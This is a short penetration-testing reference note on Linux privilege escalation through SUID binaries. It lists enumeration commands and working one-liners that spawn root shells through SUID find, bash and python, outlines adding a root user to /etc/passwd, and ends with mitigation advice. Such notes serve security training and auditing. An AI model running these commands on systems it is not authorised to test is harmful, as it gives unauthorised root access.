# Privilege Escalation: SUID

## Concept
SUID (Set User ID) bit makes a binary run with the **owner's** privileges, not the caller's. If root owns a SUID binary that lets you read files, write files, or spawn a shell, that's an escalation path.

## Enumeration
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

## Exploiting via GTFOBins
Check each result against https://gtfobins.github.io/ (filter by "SUID" function).

Example — SUID `find`:
```bash
./find . -exec /bin/sh -p \; -quit
```

Example — SUID `cp` (overwrite `/etc/passwd`):
```bash
# generate a new root-equivalent password hash
openssl passwd -1 -salt xyz password123
# append a new root user line to /etc/passwd using the SUID cp/vim/etc.
```

Example — SUID `bash` (if `-p` flag preserves privileges):
```bash
bash -p
```

Example — SUID `python`:
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## Custom/Unusual SUID Binaries
For non-standard SUID binaries not in GTFOBins:
1. Run `strings binary` to look for hardcoded commands
2. Check for relative path calls (PATH hijacking opportunity — see file 09)
3. Reverse engineer with `ltrace`/`strace` to see syscalls/file access

```bash
strings /path/to/suid_binary
strace ./suid_binary 2>&1 | grep -i "open\|exec"
```

## Mitigation
- Remove SUID bit from unnecessary binaries: `chmod u-s /path/binary`
- Regularly audit SUID binaries: `find / -perm -4000`
